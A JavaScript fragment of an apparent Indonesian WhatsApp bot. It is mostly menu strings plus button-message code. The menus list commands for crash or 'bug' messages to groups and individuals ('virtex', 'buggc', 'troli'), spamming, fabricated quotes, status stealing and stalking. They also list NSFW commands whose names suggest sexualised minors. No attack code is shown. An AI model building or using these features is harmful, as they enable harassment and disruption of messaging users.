const totalchatt1 = await ALIYABOT.chats.all()
const timestampp1 = speed();
const latensot1 = speed() - timestampp1
menu1 = `╭─❒ *LIST ALL MENU BOT*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙈𝘼𝙆𝙄𝙉𝙂 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}emoji
│_/\_ ${prefix}golden text
│_/\_ ${prefix}flower text
│_/\_ ${prefix}wooden text
│_/\_ ${prefix}burn text
│_/\_ ${prefix}glow text
│_/\_ ${prefix}summer text
│_/\_ ${prefix}neon text
│_/\_ ${prefix}coffeecup text
│_/\_ ${prefix}coffeecup2 text
│_/\_ ${prefix}battlefield text|text
│_/\_ ${prefix}googletxt2 text|text
│_/\_ ${prefix}transformer text|text
│_/\_ ${prefix}write text
│_/\_ ${prefix}waifu
│_/\_ ${prefix}phlogo text|*text
│_/\_ ${prefix}tfire text
│_/\_ ${prefix}phcomment text|text
│_/\_ ${prefix}wolf text
│_/\_ ${prefix}ytgol text
│_/\_ ${prefix}ytsilver text
│_/\_ ${prefix}t3d text
│_/\_ ${prefix}logoa text|text
│_/\_ ${prefix}marvel text|text
│_/\_ ${prefix}leavest text
│_/\_ ${prefix}neon2 text
│_/\_ ${prefix}wall text
│_/\_ ${prefix}notewrite text
│_/\_ ${prefix}pubglogo text|text
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/narutomo/wabot-aq
│_/\_Notes : mendkng timdur:v
└──────────────────❒
`
// seperti biasa kawan²
// saya enc
// kalo mau ganti image nya

// upload di imgibb ambil link gambar

//tempel di src/setting.json nama nya "imgmenu" : "taroh di situ",
let mew = await ALIYABOT.prepareMessage(from, fs.readFileSync('./stik/fake.jpeg'), image)
gbutsanmm = [
  
              {buttonId:`${prefix}menu`,buttonText:{displayText:' MENU'},type:1},

{buttonId:`${prefix}owner`,buttonText:{displayText:'OWNER'},type:1},

{buttonId:`${prefix}script`,buttonText:{displayText:'SCRIPT'},type:1}

]
        let mhan = await ALIYABOT.prepareMessage("0@s.whtsapp.net", fs.readFileSync('./stik/fake.jpeg'), image)
gbutsan = [{buttonId: `${prefix}menu`, buttonText: {displayText: '</BACK'}, type: 1},{buttonId: `${prefix}donasi`, buttonText: {displayText: '</DONASI'}, type: 1},{buttonId: `${prefix}credits`, buttonText: {displayText: '</OWNER︎'}, type: 1}]
gbuttonan = {
imageMessage: mhan.message.imageMessage,
    
contentText: `${menu1}`,// ini buat nampilin menunya
    
footerText: `kontol delay bot nya`,
    
buttons: gbutsan,
    
headerType: 4
}
// yg di ubh yg atass
await ALIYABOT.sendMessage(from, gbuttonan, MessageType.buttonsMessage,{sendEphemeral: true, contextInfo: {forwardingScore: 508, isForwarded: true, "externalAdReply": { "title": `Hallo ${pushname}`, "body": `${ucapanWaktu}`, "mediaType": "2", "thumbnail": "ofrply", "mediaUrl": "https://youtu.be/kYDvPxWdTYU", "thumbnail": ofrply, "sourceUrl": "",},mentionedJid:[sender]}, quoted :mek})

  break
case 'menuajaj2':
tes =`Hai Kak @${sender.split('@')[0]}`
tes2 =`╭─❒ ⌜ 𝙎𝙄𝙈𝙋𝙇𝙀 𝙈𝙀𝙉𝙐 ⌟ ❒
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│    ⬣ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
│_/\_  ${prefix}slot
│_/\_  ${prefix}tictactoe @tag
│_/\_  ${prefix}tebakgambar
│_/\_  ${prefix}suit *batu/kertas/gunting*
│
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/narutomo/wabot-aq
│_/\_Notes : mendkng timdur:v
└❏─────────────`
sendButLocation(from, tes,tes2,`Active : ${runtime(process.uptime())}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}listmenu`,buttonText:{displayText:'LIST MENU'},type:1},{buttonId:`${prefix}sewa`,buttonText:{displayText:'SEWA BOT'},type:1},{buttonId:`${prefix}syarat`,buttonText:{displayText:'RULES BOT'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break                    
case "semuamenu":
   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})            
   reply(`╭─❒ *LIST ALL MENU BOT*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│ 
│   ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│    ⬣ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
│_/\_  ${prefix}slot
│_/\_  ${prefix}tictactoe @tag
│_/\_  ${prefix}tebakgambar
│_/\_  ${prefix}suit *batu/kertas/gunting*
│
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│ 
│    ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
└──────[ GITHUB ]──────❒
│_/\_Script Ory :
│_/\_https://github.com/narutomo/wabot-aq
│_/\_Notes : mendkng timdur:v
└──────────────────❒`)
break
case "keranjang":
   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})          
   katalog(`╭─❒ *LIST MENU BOT*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
